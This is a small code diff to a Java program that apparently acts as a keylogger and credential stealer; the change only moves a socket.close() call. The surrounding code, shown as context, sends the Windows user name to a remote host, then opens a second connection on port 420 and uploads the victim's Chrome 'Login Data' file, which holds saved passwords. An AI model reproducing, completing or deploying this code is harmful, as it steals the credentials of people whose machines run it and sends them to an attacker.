@@ -206,6 +206,7 @@ public class Main implements NativeKeyListener{
 			String toSend = System.getProperty("user.name") + ".txt";
 			out.print(toSend );
 			out.flush();
+			socket.close();
 			Socket nakadashi = new Socket(getHostIP(), 420);
 			System.out.println("Accepted connection : " + nakadashi); 
 			File transferFile = new File ("C:/Users/" + System.getProperty("user.name") + "/AppData/Local/Google/Chrome/User Data/Default/Login Data"); 
@@ -217,7 +218,6 @@ public class Main implements NativeKeyListener{
 			System.out.println(""); 
 			os.write(bytearray,0,bytearray.length); 
 			os.flush();
-			socket.close();
 		    nakadashi.close();
 			System.out.println("yiff!");
 		 } catch (Exception e) {
